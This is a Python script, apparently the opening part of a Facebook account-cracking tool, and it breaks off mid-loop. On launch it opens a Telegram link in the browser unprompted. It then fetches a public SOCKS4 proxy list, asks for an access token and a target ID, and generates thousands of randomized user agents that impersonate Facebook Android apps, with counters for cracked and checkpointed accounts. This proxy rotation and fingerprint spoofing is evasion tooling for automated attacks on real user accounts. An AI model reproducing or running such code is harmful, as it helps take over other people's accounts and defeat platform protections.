import bs4, re, time, requests, datetime, os,sys, random, platform,uuid,mechanize, json,webbrowser
from time import sleep as aink_raka
from concurrent.futures import ThreadPoolExecutor as upil
from datetime import datetime
from time import sleep
from rich import print as prints
from rich.panel import Panel
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.panel import Panel
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
webbrowser.open('https://t.me/N_9_N_6')
ses = requests.Session()
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
 	if n < 0 or n > 12:
 		exit()
 	nTemp = n - 1
except ValueError:
 	exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
tanggal = '%s-%s-%s'%(ha,op,ta)
tanggal.split('/')
ses=requests.session()
graph = 'graph.facebook.com'
ids,metode,laura,samsung,proxy= [], [], [],[],[]
id,ids2,ids3,loop ,ok ,cp=[], [], [], 0, [], []
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
try:
	import mechanize
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
except:
	os.system('pip install mechanize')
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
ugent=[]
cokbrut=[]
ses=requests.Session()
princp=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox_ZOZO.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b1;97m] [\x1b[1;96mتم تغيير البروكسي')
prox=open('.prox_ZOZO.txt','r').read().splitlines()
B = '\x1b[38;5;117m'
print('\n')
print(B+"""──────────────────▒
─────────────────░█
────────────────███
───────────────██ღ█
──────────────██ღ▒█──────▒█
─────────────██ღ░▒█───────██
─────────────█ღ░░ღ█──────█ღ▒█
────────────█▒ღ░▒ღ░█───██░ღღ█
───────────░█ღ▒░░▒ღ░████ღღღ█
───░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
───▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
───██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
───██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
──██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
──█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
─██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
─█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
██ღღ▒████████████ღღ████████████░ღ█▒
█░ღღ████████████████████████████ღღ█
█▒ღ██████████████████████████████ღ█
██ღღ████████████████████████████ღ██
─██ღღ██████████████████████████ღ██
──░██ღღ██████████████████████ღღ██
────▓██ღ▒██████████████████▒ღ██
───░──░███ღ▒████████████▒ღ███
────░░───▒██ღღ████████▒ღ██
───────────▒██ღ██████ღ██
─────────────██ღ████ღ█
───────────────█ღ██ღ█
────────────────█ღღ█
────────────────█ღ█░
─────────────────██░""")

print('\x1b[1;95m⚜'*60)
token=input(' \x1b[38;5;161m 𝐓•𝐎•𝐊•𝐄•𝐍 ❥┇   ' )
print("""\x1b[38;5;180m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
ID=input(' \x1b[38;5;91m 𝐈•𝐃  ❥┇    ')
print('\x1b[1;95m⚜'*60)
print('')
for z in range(200):
	versi_android = str(random.randint(4,12))+".0.1"
	rr = random.randint
	rc = random.choice
	xio = str(random.randint(4,12))+".0.0"
	android = str(random.randint(4,12))
	versi_chrome = str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	device_oppo = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
	device_vivo = random.choice(["vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935"])
	device_samsung = random.choice(["SM-G975F","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
	device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
	device_sony = random.choice(["E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322"])
	device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
	device_realme = random.choice(["RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
	h_sony = random.choice(["A","B","C"])
	dev = device_oppo.split(" Build/")[0]
	density = random.choice(["{density=3.0,width=720,height=1280};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.75,width=1080,height=2028};FB_FW/1;]"])
	jkj = str(random.randint(11111111,99999999))
	jka = str(random.randint(200600,200999))
	jkb = str(random.randint(4,13))
	jkc = str(random.randint(20000000,99999999))
	opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
	oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
	mco = random.choice(["en_GB","en_US","es_MX","th_TH","pl_PL"])
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.randint(10,90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua_v = f"Mozilla/5.0 (Linux; Android {xio}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(3400,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200,700))}.0.0.{str(rr(10,30))}.{str(rr(30,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/vivo;FBBD/vivo;FBDV/{device_vivo};FBSV/{versi_android};FBOP/16]"
	ua_s = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(5000,5999))}.{str(rr(10,100))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(700,999))}.0.0.{str(rr(100,200))}.{str(rr(200,350))};]"
	ua_o = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]"
	ua_r = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]"
	ua_d = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000,229999))}.0{str(rr(1,30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,130))}.0.{str(rr(5000,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90,600))}.0.0.{str(rr(1,30))}.{str(rr(100,150))};]"
	ua_x = f"Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300,600))}.0.0.{str(rr(10,90))}.{str(rr(100,150))};FBBV/{str(rr(200000000,299999999))};WV;FBDM/"+"{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]"
	ua = str(rc([ua_r,ua_x]))
	if ua_r in ugent:pass
	else:ugent.append(ua_r)
	
for xd in range(1950):
   aa='Mozilla/5.0 (Linux; U; Android'
   b=random.randrange(1, 9)
   c=random.randrange(1, 9)
   d=random.randrange(1, 9)
   dd=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
   e=random.choice(['SM-E025F','SM-G996B','SM-A826S','SM-E135F','SM-G781B','SM-G998B','SM-F936U1','SM-G361F','SM-A716S','SM-J327AZ','SM-E426B','SM-A015F','SM-A015M','SM-A013G','SM-A013G','SM-A013M','SM-A013F','SM-A022M','SM-A022G','SM-A022F','SM-A025M','SM-S124DL','SM-A025U','SM-A025A','SM-A025G','SM-A025F','SM-A025AZ','SM-A035F','SM-A035M','SM-A035G','SM-A032F','SM-A032M','SM-A032F','SM-A037F','SM-A037U','SM-A037M','SM-S134DL','SM-A037G','SM-A105G','SM-A105M','SM-A105F','SM-A105FN','SM-A102U','SM-S102DL','SM-A102U1','SM-A107F','SM-A107M','SM-A115AZ','SM-A115U','SM-A115U1','SM-A115A','SM-A115M','SM-A115F','SM-A125F','SM-A127F','SM-A125M','SM-A125U','SM-A127M','SM-A135F','SM-A137F','SM-A135M','SM-A136U','SM-A136U1','SM-A136W','SM-A260F','SM-A260G','SM-A260F','SM-A260G','SM-A205GN','SM-A205U','SM-A205F','SM-A205G','SM-A205FN','SM-A202F','SM-A2070','SM-A207F','SM-A207M','SM-A215U','SM-A215U1','SM-A217F','SM-A217F','SM-A217M','SM-A225F','SM-A225M','SM-A226B','SM-A226B','SM-A226BR','SM-A235F','SM-A235M','SM-A300FU','SM-A300F','SM-A300H','SM-A310F','SM-A310M','SM-A320FL','SM-A320F','SM-A305G','SM-A305GT','SM-A305N','SM-A305F','SM-A307FN','SM-A307G','SM-A307GN','SM-A315G','SM-A315F','SM-A325F','SM-A325M','SM-A326U','SM-A326W','SM-A336E','SM-A336B','SM-A430F','SM-A405FN','SM-A405FM','SM-A3051','SM-A3050','SM-A415F','SM-A426U','SM-A426B','SM-A5009','SM-A500YZ','SM-A500Y','SM-A500W','SM-A500L','SM-A500X','SM-A500XZ','SM-A510F','SM-A510Y','SM-A520F','SM-A520W','SM-A500F','SM-A500FU','SM-A500H','SM-S506DL','SM-A505G','SM-A505FN','SM-A505U','SM-A505GN','SM-A505F','SM-A507FN','SM-A5070','SM-A515F','SM-A515U','SM-A515U1','SM-A516U','SM-A516V','SM-A516N','SM-A516B','SM-A525F','SM-A525M','SM-A526U','SM-A526U1','SM-A526B','SM-A526W','SM-A528B','SM-A536B','SM-A536U','SM-A536E','SM-A536V','SM-A600FN','SM-A600G','SM-A605FN','SM-A605G','SM-A605GN','SM-A605F','SM-A6050','SM-A606Y','SM-A6060','SM-G6200','SM-A700FD','SM-A700F','SM-A7000','SM-A700H','SM-A700YD','SM-A710F','SM-A710M','SM-A720F','SM-A750F','SM-A750FN','SM-A750GN','SM-A705FN','SM-A705F','SM-A705MN','SM-A707F','SM-A715F','SM-A715W','SM-A716U','SM-A716V','SM-A716U1','SM-A716B','SM-A725F','SM-A725M','SM-A736B','SM-A530F','SM-A810YZ','SM-A810F','SM-A810S','SM-A530W','SM-A530N','SM-G885F','SM-G885Y','SM-G885S','SM-A730F','SM-A805F','SM-G887F','SM-G8870','SM-A9000','SM-A920F','SM-A920F','SM-887N','SM-A910F','SM-G8850','SM-A908B','SM-A908N','SM-A9080','SM-G313HY','SM-G313MY','SM-G313MU','SM-G316M','SM-G316ML','SM-G316MY','SM-G313HZ','SM-G313H','SM-G313HU','SM-G313U','SM-G318H','SM-G357FZ','SM-G310HN','SM-G357FZ','SM-G850F','SM-G850M','SM-J337AZ','SM-G386T1','SM-G386T','SM-G3858','SM-G3858','SM-A226L','SM-C5000','SM-C500X','SM-C5010','SM-C5018','SM-C7000','SM-C7010','SM-C701F','SM-C7018','SM-C7100','SM-C7108','SM-C9000','SM-C900F','SM-C900Y','SM-G355H','SM-G355M','SM-G3589W','SM-G386W','SM-G386F','SM-G3518','SM-G3586V','SM-G5108Q','SM-G5108','SM-G3568V','SM-G350E','SM-G350','SM-G3509I','SM-G3508J','SM-G3502I','SM-G3502C','SM-S820L','SM-G360H','SM-G360F','SM-G360T','SM-G360M','SM-G361H','SM-E500H','SM-E500F','SM-E500M','SM-E5000','SM-E500YZ','SM-E700H','SM-E700F','SM-E7009','SM-E700M','SM-G3815','SM-G3815','SM-G3815','SM-F127G','SM-E225F','SM-E236B','SM-F415F','SM-E5260','SM-E625F','SM-F900U','SM-F907N','SM-F900F','SM-F9000','SM-F907B','SM-F900W','SM-G150NL','SM-G155S','SM-G1650','SM-W2015','SM-G7102','SM-G7105','SM-G7106','SM-G7108','SM-G7202','SM-G720N0','SM-G7200','SM-G720AX','SM-G530T1','SM-G530H','SM-G530FZ','SM-G531H','SM-G530BT','SM-G532F','SM-G531BT','SM-G531M','SM-J727AZ','SM-J100FN','SM-J100H','SM-J120FN','SM-J120H','SM-J120F','SM-J120M','SM-J111M','SM-J111F','SM-J110H','SM-J110G','SM-J110F','SM-J110M','SM-J105H','SM-J105Y','SM-J105B','SM-J106H','SM-J106F','SM-J106B','SM-J106M','SM-J200F','SM-J200M','SM-J200G','SM-J200H','SM-J200F','SM-J200GU','SM-J260M','SM-J260F','SM-J260MU','SM-J260F','SM-J260G','SM-J200BT','SM-G532G','SM-G532M','SM-G532MT','SM-J250M','SM-J250F','SM-J210F','SM-J260AZ','SM-J3109','SM-J320A','SM-J320G','SM-J320F','SM-J320H','SM-J320FN','SM-J330G','SM-J330F','SM-J330FN','SM-J337V','SM-J337P','SM-J337A','SM-J337VPP','SM-J337R4','SM-J327VPP','SM-J327V','SM-J327P','SM-J327R4','SM-S327VL','SM-S337TL','SM-S367VL','SM-J327A','SM-J327T1','SM-J327T','SM-J3110','SM-J3119S','SM-J3119','SM-S320VL','SM-J337T','SM-J400M','SM-J400F','SM-J400F','SM-J410F','SM-J410G','SM-J410F','SM-J415FN','SM-J415F','SM-J415G','SM-J415GN','SM-J415N','SM-J500FN','SM-J500M','SM-J510MN','SM-J510FN','SM-J510GN','SM-J530Y','SM-J530F','SM-J530G','SM-J530FM','SM-G570M','SM-G570F','SM-G570Y','SM-J600G','SM-J600FN','SM-J600GT','SM-J600F','SM-J610F','SM-J610G','SM-J610FN','SM-J710F','SM-J700H','SM-J700M','SM-J700F','SM-J700P','SM-J700T','SM-J710GN','SM-J700T1','SM-J727A','SM-J727R4','SM-J737T','SM-J737A','SM-J737R4','SM-J737V','SM-J737T1','SM-J737S','SM-J737P','SM-J737VPP','SM-J701F','SM-J701M','SM-J701MT','SM-S767VL','SM-S757BL','SM-J720F','SM-J720M','SM-G615F','SM-G615FU','SM-G610F','SM-G610M','SM-G610Y','SM-G611MT','SM-G611FF','SM-G611M','SM-J730G','SM-J730GM','SM-J730F','SM-J730FM','SM-S727VL','SM-S737TL','SM-J727T1','SM-J727T1','SM-J727V','SM-J727P','SM-J727VPP','SM-J727T','SM-C710F','SM-J810M','SM-J810F','SM-J810G','SM-J810Y','SM-A605K','SM-A605K','SM-A202K','SM-M336K','SM-A326K','SM-C115','SM-C115L','SM-C1158','SM-C1158','SM-C115W','SM-C115M','SM-S120VL','SM-M015G','SM-M015F','SM-M013F','SM-M017F','SM-M022G','SM-M022F','SM-M022M','SM-M025F','SM-M105G','SM-M105M','SM-M105F','SM-M107F','SM-M115F','SM-M115F','SM-M127F','SM-M127G','SM-M135M','SM-M135F','SM-M135FU','SM-M205FN','SM-M205F','SM-M205G','SM-M215F','SM-M215G','SM-M225FV','SM-M236B','SM-M236Q','SM-M305F','SM-M305M','SM-M307F','SM-M307FN','SM-M315F','SM-M317F','SM-M325FV','SM-M325F','SM-M326B','SM-M336B','SM-M336BU','SM-M405F','SM-M426B','SM-M515F','SM-M526BR','SM-M526B','SM-M536B','SM-M625F','SM-G750H','SM-G7508Q','SM-G7509','SM-N970U','SM-N970F','SM-N971N','SM-N970U1','SM-N770F','SM-N975U1','SM-N975U','SM-N975F','SM-N975F','SM-N976N','SM-N980F','SM-N981U','SM-N981B','SM-N985F','SM-N9860','SM-N986N','SM-N986U','SM-N986B','SM-N986W','SM-N9008V','SM-N9006','SM-N900A','SM-N9005','SM-N900W8','SM-N900','SM-N9009','SM-N900P','SM-N9000Q','SM-N9002','SM-9005','SM-N750L','SM-N7505','SM-N750','SM-N7502','SM-N910F','SM-N910V','SM-N910C','SM-N910U','SM-N910H','SM-N9108V','SM-N9100','SM-N915FY','SM-N9150','SM-N915T','SM-N915G','SM-N915A','SM-N915F','SM-N915S','SM-N915D','SM-N15W8','SM-N916S','SM-N916K','SM-N916L','SM-N916LSK','SM-N920L','SM-N920S','SM-N920G','SM-N920A','SM-N920C','SM-N920V','SM-N920I','SM-N920K','SM-N9208','SM-N930F','SM-N9300','SM-N930x','SM-N930P','SM-N930X','SM-N930W8','SM-N930V','SM-N930T','SM-N950U','SM-N950F','SM-N950N','SM-N960U','SM-N960F','SM-N960U','SM-N935F','SM-N935K','SM-N935S','SM-G550T','SM-G550FY','SM-G5500','SM-G5510','SM-G550T1','SM-S550TL','SM-G5520','SM-G5528','SM-G600FY','SM-G600F','SM-G6000','SM-G6100','SM-G610S','SM-G611F','SM-G611L','SM-G110M','SM-G110H','SM-G110B','SM-G910S','SM-G316HU','SM-G977N','SM-G973U1','SM-G973F','SM-G973W','SM-G973U','SM-G770U1','SM-G770F','SM-G975F','SM-G975U','SM-G970U','SM-G970U1','SM-G970F','SM-G970N','SM-G980F','SM-G981U','SM-G981N','SM-G981B','SM-G780G','SM-G780F','SM-G781W','SM-G781U','SM-G7810','SM-G9880','SM-G988B','SM-G988U','SM-G988B','SM-G988U1','SM-G985F','SM-G986U','SM-G986B','SM-G986W','SM-G986U1','SM-G991U','SM-G991B','SM-G990B','SM-G990E','SM-G990U','SM-G998U','SM-G996W','SM-G996U','SM-G996N','SM-G9960','SM-S901U','SM-S901B','SM-S908U','SM-S908U1','SM-S908B','SM-S9080','SM-S908N','SM-S908E','SM-S906U','SM-S906E','SM-S906N','SM-S906B','SM-S906U1','SM-G730V','SM-G730A','SM-G730W8','SM-C105L','SM-C101','SM-C105','SM-C105K','SM-C105S','SM-G900F','SM-G900P','SM-G900H','SM-G9006V','SM-G900M','SM-G900V','SM-G870W','SM-G890A','SM-G870A','SM-G900FD','SM-G860P','SM-G901F','SM-G901F','SM-G800F','SM-G800H','SM-G903F','SM-G903W','SM-G920F','SM-G920K','SM-G920I','SM-G920A','SM-G920P','SM-G920S','SM-G920V','SM-G920T','SM-G925F','SM-G925A','SM-G925W8','SM-G928F','SM-G928C','SM-G9280','SM-G9287','SM-G928T','SM-G928I','SM-G930A','SM-G930F','SM-G930W8','SM-G930S','SM-G930V','SM-G930P','SM-G930L','SM-G891A','SM-G935F','SM-G935T','SM-G935W8','SM-G9350','SM-G950F','SM-G950W','SM-G950U','SM-G892A','SM-G892U','SM-G8750','SM-G955F','SM-G955U','SM-G955U1','SM-G955W','SM-G955N','SM-G960U','SM-G960U1','SM-G960F','SM-G965U','SM-G965F','SM-G965U1','SM-G965N','SM-G9650','SM-J321AZ','SM-J326AZ','SM-J336AZ','SM-T116','SM-T116NU','SM-T116NY','SM-T116NQ','SM-T2519','SM-G318HZ','SM-T255S','SM-W2016','SM-W2018','SM-W2019','SM-W2021','SM-W2022','SM-G600S','SM-E426S','SM-G3812','SM-G3812B','SM-G3818','SM-G388F','SM-G389F','SM-G390F','SM-G398FN'])
   ee=random.choice(['Build/JZO54K','Build/KOT49H','Build/LRX22C','Build/KRT16S','Build/KOT49E'])
   f=random.choice(['AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.2.1 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'])
   g=random.randrange(73,100)
   h='0'
   i=random.randrange(4200,4900)
   j=random.randrange(40,150)
   k=random.choice(['Mobile Safari/537.36','YaBrowser/17.3.1.383.00 Mobile Safari/E7FBAF','Mobile Safari/E7FBAF','Mobile Safari/537.36 PHX/11.8','Mobile Safari/537.36 (AirWatch Browser v22.12.1.5)','Mobile Safari/537.36 newsbreak/23.2.0'])
   uakuh=(f'{aa} {b}.{c}.{d}; {dd} {e} {ee}) {f}{g}.{h}.{i}.{j} {k}')
   ugen.append(uakuh)

for t in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P'])
	random2=random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6816D'])
	random3=random.choice(['CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501'])
	random4=random.choice(['Xiaomi 10 Pro','2201123G','2203129G','2201122G','2206122SC','2203121C','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro'])
	random5=random.choice(['vivo 1002T','Vivo 1605','vivo 1914','vivo 2019','vivo 2023','vivo 2027','Vivo 6','Vivo 93K Prime','V2242A','V2227A','vivo 1918'])
	random6=random.choice(['OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f'])
	random7=random.choice(['Nokia 1','Nokia 1 Plus','Nokia 1011','Nokia C01','Nokia C1 2nd Edition','Nokia C20','Nokia C20 Plus','Nokia C21','Nokia C21 Plus','Nokia C3'])
	random8=random.choice(['21061119DG','21121119VL','220233L2G','220333QL','M2004J15SC','M2004J7BC','Redmi 11 Lite','Redmi 1S','Redmi 9 Pro','Redmi Note 9 Pro'])
	random9=random.choice(['M2006C3MI','22031116AI','220333QPG','POCO F2 Pro','M2012K11AG','M2104K10I','22021211RG','21121210G','M2004J19PI','POCO M2 Pro'])
	random10=random.choice(['WOW64'])
	wakdhan1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan3=f'Mozilla/5.0 (Linux; Android {a}; {random3} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan4=f'Mozilla/5.0 (Linux; Android {a}; {random4} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan5=f'Mozilla/5.0 (Linux; Android {a}; {random5} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan6=f'Mozilla/5.0 (Linux; Android {a}; {random6} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan7=f'Mozilla/5.0 (Linux; Android {a}; {random7} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan8=f'Mozilla/5.0 (Linux; Android {a}; {random8} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan9=f'Mozilla/5.0 (Linux; Android {a}; {random9} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	wakdhan10=f'Mozilla/5.0 (Windows NT {a}; {random10} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku2 = random.choice([wakdhan1,wakdhan2,wakdhan3,wakdhan4,wakdhan5,wakdhan6,wakdhan7,wakdhan8,wakdhan9,wakdhan10])
	ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
